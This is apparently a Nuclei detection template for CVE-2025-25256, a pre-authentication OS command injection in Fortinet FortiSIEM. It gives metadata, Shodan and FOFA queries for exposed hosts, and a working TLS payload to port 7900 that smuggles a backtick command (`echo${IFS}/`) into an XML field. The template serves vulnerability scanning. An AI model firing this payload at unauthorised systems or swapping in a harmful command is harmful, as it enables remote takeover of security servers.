id: CVE-2025-25256
info:
  author: watchtowr,darses
  classification:
    cpe: cpe:2.3:a:fortinet:fortisiem:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-25256
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.96588
    epss-score: 0.31257
  description: 'Fortinet FortiSIEM 6.7.9 < version <= 7.3.1 contains an OS command
    injection caused by improper neutralization of special elements in CLI requests,
    letting unauthenticated attackers execute unauthorized commands remotely.

    '
  impact: 'Unauthenticated attackers can execute arbitrary commands, potentially leading
    to full system compromise.

    '
  metadata:
    fofa-query:
    - icon_hash="-1341442175"
    - body="var hst = location.hostname"
    product: fortisiem
    shodan-query:
    - http.favicon.hash:-1341442175
    - http.html:"var hst = location.hostname"
    vendor: fortinet
  name: Fortinet FortiSIEM - OS Command Injection
  reference:
  - https://www.fortiguard.com/psirt/FG-IR-25-152
  - https://github.com/watchtowrlabs/watchTowr-vs-FortiSIEM-CVE-2025-25256
  - https://labs.watchtowr.com/should-security-solutions-be-secure-maybe-were-all-wrong-fortinet-fortisiem-pre-auth-command-injection-cve-2025-25256/
  remediation: 'Update to the latest version beyond 7.3.1.

    '
  severity: critical
  tags: cve,cve2025,rce,network,tcp,fortinet,vkev,vuln
tcp:
- host:
  - tls://{{Hostname}}
  inputs:
  - data: '{{payload}}'
  matchers:
  - part: raw
    type: word
    words:
    - "\x01\0\0\0"
  port: 7900
  read-size: 1024
variables:
  payload: "Z\0\0\0{{hex_decode(dec_to_hex(len(xml)))}}\0\0\0oB\x1E@\0\0\0\0{{xml}}"
  xml: "<root>\n  <archive_storage_type>nfs</archive_storage_type>\n  <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>\n\
    \  <archive_nfs_archive_dir>`echo${IFS}/`</archive_nfs_archive_dir>\n  <scope>local</scope>\n\
    </root>\n"
